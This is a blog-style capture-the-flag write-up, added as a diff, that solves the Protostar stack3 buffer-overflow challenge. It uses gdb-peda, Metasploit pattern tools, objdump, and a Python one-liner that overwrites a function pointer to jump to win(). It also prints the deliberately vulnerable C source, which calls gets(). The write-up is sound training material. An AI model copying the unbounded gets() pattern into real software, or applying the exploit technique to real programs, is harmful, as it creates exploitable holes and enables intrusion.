@@ -1,0 +1,99 @@
+<hr />
+
+<h3 id="introduction">Introduction</h3>
+<h4 id="hey-im-back-again-with-another-article--today-im-going-to-solve-protostar-stack3-but-this-time-its-going-to-be-a-bit-different--in-the-last-two-articles-i-solved-stack0--stack1-and-stack2-and-i-used-the-source-code-of-the-binaries-to-identify-where-the-buffer-overflow-happens-and-what-exploit-to-use-now-with-stack3-we-are-given-the-source-code-but-we-are-not-going-to-use-it-instead-of-that-we-will-use-some-practical-techniques-to-solve-this-challenge-because-in-a-real-situation-we-wont-have-the-source-of-the-program-right--lets-see">Hey I’m back again with another article , today I’m going to solve protostar stack3 but this time it’s going to be a bit different , In the last two articles I solved stack0 , stack1 and stack2 and I used the source code of the binaries to identify where the buffer overflow happens and what exploit to use. Now with stack3 we are given the source code but We are not going to use it, Instead of that we will use some practical techniques to solve this challenge. Because in a real situation we won’t have the source of the program right ? Let’s see</h4>
+<p><img src="/images/binary-exploitation/BOF3/0.png" alt="" />
+<br /></p>
+<h4 id="if-you-havent-read-my-previous-articles-about-buffer-overflow-i-recommend-reading-them-first">If you haven’t read my <a href="/binary-exploitation/bof2/">previous articles</a> about buffer overflow I recommend reading them first</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="stack3">./Stack3</h3>
+<h4 id="lets-first-look-at-the-program-and-see-what-does-it-do">Let’s first look at the program and see what does it do.</h4>
+<p><code class="highlighter-rouge"> ./stack3</code>
+<img src="/images/binary-exploitation/BOF3/1.png" alt="" /></p>
+<h4 id="we-dont-see-any-output-so-we-should-give-it-an-argument-we-need-to-confirm-that-the-program-is-vulnerable-to-a-buffer-overflow-so-we-can-pass-an-argument-of-100-chars-and-see-what-happens">We don’t see any output so we should give it an argument. We need to confirm that the program is vulnerable to a buffer overflow so we can pass an argument of 100 chars and see what happens</h4>
+<p><code class="highlighter-rouge">python -c "print 'A' * 100" | ./stack3</code>
+<img src="/images/binary-exploitation/BOF3/2.png" alt="" /></p>
+<h4 id="and-we-see-a-segfault-which-confirms-that-a-buffer-overflow-happened--we-also-see-this-line--calling-function-pointer--jumping-to-0x41414141">And we see a segfault which confirms that a buffer overflow happened , we also see this line : “calling function pointer , jumping to 0x41414141”</h4>
+<h4 id="so-now-we-have-an-idea-about-whats-happening-here-theres-a-function-pointer-that-executes-a-function-based-on-the-given-memory-address-of-that-function-that-memory-address-is-stored-in-a-variable-and-we-can-overwrite-that-variable-when-we-exceed-the-buffer-we-see-that-the-function-pointer-was-calling-the-address-0x41414141-and-0x41-is-the-hex-of-a-now-we-have-to-do-two-things-the-first-thing-is-to-know-where-the-buffer-overflow-happens-because-here-we-have-given-the-program-an-argument-of-100-chars-but-we-dont-know-exactly-the-size-of-the-buffer-the-second-thing-is-to-find-the-memory-address-of-the-function-that-we-need-to-execute-lets-see-how-to-do-that">So now we have an idea about what’s happening here, There’s a function pointer that executes a function based on the given memory address of that function. That memory address is stored in a variable and we can overwrite that variable when we exceed the buffer. We see that the function pointer was calling the address <code class="highlighter-rouge">0x41414141</code> and <code class="highlighter-rouge">0x41</code> is the hex of “A”. Now we have to do two things. The first thing is to know where the buffer overflow happens, Because here we have given the program an argument of 100 chars but we don’t know exactly the size of the buffer. The second thing is to find the memory address of the function that we need to execute. Let’s see how to do that.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="finding-the-size-of-the-buffer">Finding the size of the buffer</h3>
+<h4 id="to-make-things-easier-i-compiled-the-program-on-my-kali-box-to-start-testing-there">To make things easier I compiled the program on my kali box to start testing there.</h4>
+<h4 id="metasploit-has-two-scripts-called-pattern_create-and-pattern_offset--you-can-find-them-on-kali-in-usrsharemetasploit-frameworktoolsexploit">Metasploit has two scripts called <code class="highlighter-rouge">pattern_create</code> and <code class="highlighter-rouge">pattern_offset</code> , you can find them on kali in <code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit</code></h4>
+<h4 id="pattern_create-creats-a-unique-string-of-a-defined-length-so-we-will-create-a-pattern-of-100-chars"><code class="highlighter-rouge">pattern_create</code> creats a unique string of a defined length so we will create a pattern of 100 chars.</h4>
+<p><code class="highlighter-rouge">./pattern_create.rb -l 100</code>
+<img src="/images/binary-exploitation/BOF3/3.png" alt="" /></p>
+<h4 id="now-lets-run-the-program-in-gdb--im-using-gdb-peda">Now let’s run the program in gdb , I’m using <a href="https://github.com/longld/peda">gdb-peda</a></h4>
+<h4 id="first-we-set-a-break-point-in-main-">First we set a break point in main .</h4>
+<p><code class="highlighter-rouge">break *main</code></p>
+<h4 id="this-makes-the-program-break-after-the-first-instruction-of-the-function-main">This makes the program break after the first instruction of the function main()</h4>
+<p><img src="/images/binary-exploitation/BOF3/4.png" alt="" /></p>
+<h4 id="then-we-run-the-program">Then we <code class="highlighter-rouge">run</code> the program.</h4>
+<p><img src="/images/binary-exploitation/BOF3/5.png" alt="" /></p>
+<h4 id="it-stops-at-the-break-point-we-do-c-to-make-it-continue-then-pass-our-argument">It stops at the break point. We do <code class="highlighter-rouge">c</code> to make it continue then pass our argument</h4>
+<p><img src="/images/binary-exploitation/BOF3/6.png" alt="" /></p>
+<h4 id="the-segfault-happens-and-we-see-where-it-happened-0x63413163">The segfault happens and we see where it happened: <code class="highlighter-rouge">0x63413163</code></h4>
+<p><img src="/images/binary-exploitation/BOF3/7.png" alt="" /></p>
+<h4 id="now-we-will-use-pattern_offset-to-know-what-is-the-location-of-0x63413163">Now we will use <code class="highlighter-rouge">pattern_offset</code> to know what is the location of <code class="highlighter-rouge">0x63413163</code></h4>
+<p><code class="highlighter-rouge">./pattern_offset -l 100 -q 63413163</code>
+<img src="/images/binary-exploitation/BOF3/8.png" alt="" /></p>
+<h4 id="and-we-get-exact-match-at-offset-64--this-means-that-the-buffer-size-is-64-chars-and-after-that-the-overflow-happens">And we get exact match at offset 64 , This means that the buffer size is 64 chars and after that the overflow happens.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="finding-the-memory-address-of-the-function">Finding the memory address of the function</h3>
+<h4 id="if-we-do-info-functions-from-gdb-it-will-list-all-the-functions-and-their-memory-addresses--we-can-also-do-that-with-objdump-but-what-is-the-function-were-looking-for-">If we do <code class="highlighter-rouge">info functions</code> from gdb it will list all the functions and their memory addresses , we can also do that with objdump. But what is the function we’re looking for ?</h4>
+<p><code class="highlighter-rouge">info functions</code>
+<img src="/images/binary-exploitation/BOF3/9.png" alt="" /></p>
+<h4 id="we-see-a-lot-of-functions-but-the-most-interesting-one-is-called-win--but-the-address-on-my-kali-box-will-be-different-from-the-address-on-the-protostar-machine-we-will-return-to-protostar-and-use-objdump-to-find-it">We see a lot of functions but the most interesting one is called “win” , but the address on my kali box will be different from the address on the protostar machine. We will return to protostar and use objdump to find it.</h4>
+<p><code class="highlighter-rouge">objdump -d stack3</code>
+<img src="/images/binary-exploitation/BOF3/10.png" alt="" />
+<br />
+<br />
+<br />
+<img src="/images/binary-exploitation/BOF3/11.png" alt="" /></p>
+<h4 id="and-we-got-the-address-0x08048424">And we got the address <code class="highlighter-rouge">0x08048424</code></h4>
+<p><br /></p>
+<hr />
+
+<h3 id="applying-the-exploit">Applying the exploit</h3>
+<h4 id="now-we-can-easily-build-our-exploit--we-know-that-the-buffer-is-64-chars-after-that-we-can-pass-the-address-of-the-function-and-the-function-pointer-will-execute-it">Now we can easily build our exploit , we know that the buffer is 64 chars after that we can pass the address of the function and the function pointer will execute it.</h4>
+<p><code class="highlighter-rouge">python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3</code>
+<img src="/images/binary-exploitation/BOF3/12.png" alt="" /></p>
+<h4 id="and-we-get-the-output-code-flow-changed-successfully">And we get the output “code flow changed successfully”</h4>
+<h4 id="we-solved-it-without-the-source--now-lets-look-at-the-source">We solved it without the source , now let’s look at the source</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void win()
+{
+ printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+ volatile int (*fp)();
+ char buffer[64];
+
+ fp = 0;
+
+ gets(buffer);
+
+ if(fp) {
+  printf("calling function pointer, jumping to 0x%08x\n", fp);
+  fp();
+ }
+}
+</code></pre></div></div>
+<h4 id="we-see-function-win-is-defined-at-the-top-then-after-that-the-function-main-which-defines-the-function-pointer--sets-a-buffer-of-64-chars-to-it--then-sets-its-value-to-0-after-that-it-takes-our-argument-and-stores-it-in-the-buffer-the-last-thing-is-an-if-statement-that-checks-if-the-function-pointer-value-is-changed-from-0-then-it-calls-the-address-of-that-new-value">We see function <code class="highlighter-rouge">win()</code> is defined at the top then after that the function <code class="highlighter-rouge">main()</code> which defines the function pointer , sets a buffer of 64 chars to it , then sets its value to 0. After that it takes our argument and stores it in the buffer. The last thing is an if statement that checks if the function pointer value is changed from 0 then it calls the address of that new value.</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it-hope-you-liked-it-feedback-is-appreciated">That’s it. Hope you liked it. Feedback is appreciated.</h4>
+<h4 id="thanks-for-reading-">Thanks for reading !</h4>
+<hr />
+
